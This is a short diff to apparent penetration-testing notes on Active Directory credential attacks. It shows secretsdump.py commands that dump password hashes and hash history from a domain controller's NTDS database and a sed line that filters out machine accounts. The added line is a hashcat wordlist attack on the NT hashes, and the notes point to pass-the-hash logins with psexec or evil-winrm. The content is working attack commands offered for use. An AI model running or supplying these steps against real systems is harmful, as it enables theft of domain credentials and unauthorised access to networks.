@@ -11,6 +11,7 @@ Use secretsdump.py to dump hashes and hash history from Active Directory databas
 
     python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile dc-hashes -history     
     sed -i '/$:/d' dc-hashes.ntds     #remove machine accounts (end with $:)     
+    hashcat -m 1000 -a 0 dc-hashes.ntds ~/path_to_wordlist   #crack NT hashes with a wordlist attack      
     
 Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't need to be cracked)    
 
